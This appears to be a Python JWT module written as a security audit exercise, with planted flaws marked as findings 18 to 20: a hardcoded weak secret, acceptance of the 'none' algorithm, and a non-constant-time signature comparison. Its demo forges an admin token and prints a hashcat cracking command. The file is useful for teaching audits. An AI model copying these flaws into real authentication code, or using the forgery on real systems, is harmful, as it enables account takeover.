#!/usr/bin/env python3
"""
jwt_module.py — JWT Token Handling
====================================
Creates and verifies JWT tokens for API authentication.

AUDIT TASK: Find all cryptographic vulnerabilities and classify by severity.
"""
import base64
import json
import hmac
import hashlib

JWT_SECRET = "secret"  # FINDING #18: trivially weak secret


def create_jwt(payload: dict) -> str:
    """Create a JWT token."""
    header = {"alg": "HS256", "typ": "JWT"}

    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

    signature = hmac.new(
        JWT_SECRET.encode(),
        f"{h}.{p}".encode(),
        hashlib.sha256
    ).digest()

    s = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    return f"{h}.{p}.{s}"


def verify_jwt(token: str) -> dict:
    """Verify and decode a JWT token."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")

    header_b64, payload_b64, sig_b64 = parts

    header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))

    # FINDING #19: Accepts 'none' algorithm — bypasses HMAC entirely!
    if header['alg'] == 'none':
        return json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))

    expected_sig = hmac.new(
        JWT_SECRET.encode(),
        f"{header_b64}.{payload_b64}".encode(),
        hashlib.sha256
    ).digest()

    actual_sig = base64.urlsafe_b64decode(sig_b64 + '==')

    if expected_sig == actual_sig:  # FINDING #20: non-constant-time comparison
        return json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
    raise ValueError("Invalid signature")


# ── Demo ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("JWT Module — Vulnerability Demonstrations")
    print("=" * 50)

    # Demo 1: Create a legitimate token
    legit_token = create_jwt({"sub": "alice", "role": "analyst", "user_id": 42})
    print(f"\nLegitimate token: {legit_token[:40]}...")

    # Demo 2: Algorithm confusion — forge admin token with alg:none
    print("\n[FINDING #19] Algorithm confusion attack (alg:none):")
    forged_header = {"alg": "none", "typ": "JWT"}
    forged_payload = {"sub": "attacker", "role": "admin", "user_id": 999}

    fh = base64.urlsafe_b64encode(json.dumps(forged_header).encode()).rstrip(b'=').decode()
    fp = base64.urlsafe_b64encode(json.dumps(forged_payload).encode()).rstrip(b'=').decode()
    forged_token = f"{fh}.{fp}."   # Empty signature

    print(f"  Forged token:   {forged_token[:60]}...")
    try:
        decoded = verify_jwt(forged_token)
        print(f"  Verification result: {decoded}")
        print(f"  *** ADMIN ACCESS GRANTED WITHOUT VALID SIGNATURE ***")
    except Exception as e:
        print(f"  Error: {e}")

    # Demo 3: Weak secret brute-force
    print("\n[FINDING #18] Weak JWT secret 'secret':")
    print("  An attacker can brute-force HS256 secrets with tools like hashcat:")
    print("  $ hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt")
    print("  The word 'secret' is in every common wordlist and cracks instantly.")
